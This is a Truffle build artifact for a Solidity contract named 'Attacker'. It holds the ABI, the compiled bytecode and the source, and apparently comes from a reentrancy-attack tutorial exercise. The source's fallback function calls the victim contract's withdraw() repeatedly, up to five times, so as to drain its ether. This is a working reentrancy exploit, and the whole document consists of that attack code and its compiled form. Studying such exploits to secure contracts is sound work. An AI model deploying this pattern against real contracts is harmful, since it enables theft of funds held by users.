{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "victim",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallback",
      "type": "event"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "v",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161032e38038061032e8339818101604052602081101561003357600080fd5b81019080805190602001909291905050506000600181905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102928061009c6000396000f3fe6080604052600436106100345760003560e01c806306661abd146101165780637c2efcba146101415780639e5faafc14610198575b6001600081548092919060010191905055507ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a160056001541015610114576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b505050505b005b34801561012257600080fd5b5061012b6101af565b6040518082815260200191505060405180910390f35b34801561014d57600080fd5b506101566101b5565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101a457600080fd5b506101ad6101da565b005b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561024357600080fd5b505af1158015610257573d6000803e3d6000fd5b5050505056fea265627a7a723158209f9c53aedc590b17271045f3b2aec6cedc41574c7fd687be9827bb034b2f5def64736f6c63430005100032",
  "source": "pragma solidity ^0.5.0;\n//NOT COMPILED\n//devon@nuclo.io\n//https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2\nimport './Victim.sol';\ncontract  Attacker{\n   Victim  public v;\n   uint public  count;\n   event LogFallback(uint c, uint balance);\n   \n   \n   constructor (address victim) public {\n      count =0;\n      v=Victim(victim);\n   }\n  \n\n   function attack() public {\n      v.withdraw();\n   }\n\n   function () external payable{\n      count++;\n      emit LogFallback(count, address(this).balance);\n      if(count < 5 ) {\n         v.withdraw();\n      }\n    }\n}\n    \n",
  "sourcePath": "/home/zulfi/Truffle programs/justdev2/reentrancy/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.2.4",
  "updatedAt": "2021-01-01T05:33:02.527Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}